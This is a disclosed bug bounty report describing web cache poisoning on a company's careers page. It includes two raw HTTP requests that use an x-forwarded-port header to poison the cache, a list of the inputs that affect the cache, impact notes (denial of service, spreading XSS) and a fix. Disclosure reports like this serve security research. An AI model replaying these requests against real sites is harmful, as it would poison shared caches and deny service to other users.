# Web cache poisoning at www.acronis.com

## Report Details
- **Report ID**: 1010858
- **URL**: https://hackerone.com/reports/1010858
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-18T05:25:11.081Z
- **Disclosed**: 2021-06-17T09:25:56.736Z

## Reporter
- **Username**: 9529
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
I found the problem of cache poisoning in www.acronis.com. A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

## Steps To Reproduce

1. Use x-forwarded-port to destroy the cache, repeat the request until www.acronis.com:0 appears in the response  
```
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
```

2. Remove the parameters, x-forwarded-port, and origin in the request header. Then send the request, the cache has been polluted (due to the cache hit, it may take several more requests).  
```
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

3.Other users visit the /zh-cn/careers/ page, and the result has been poisoned.
4.The currently discovered causes of cache poisoning:
  - url params (if there is reflected XSS on the server side, it will be very dangerous)
  - x-forwarded-port header
  - x-forwarded-url header

## Recommendations
Cache poisoning is caused by different requests hitting the same cache. Remove these influencing factors, or only cache requests with unchanged results.

## Impact

1. Launch a denial of service attack
2. If a page contains url parameters or request header reflection XSS, cache poisoning can easily spread the page containing malicious code to other people without the need to communicate with the victim

More ways to exploit:
https://portswigger.net/research/practical-web-cache-poisoning
https://portswigger.net/research/web-cache-entanglement

## Attachments
No attachments
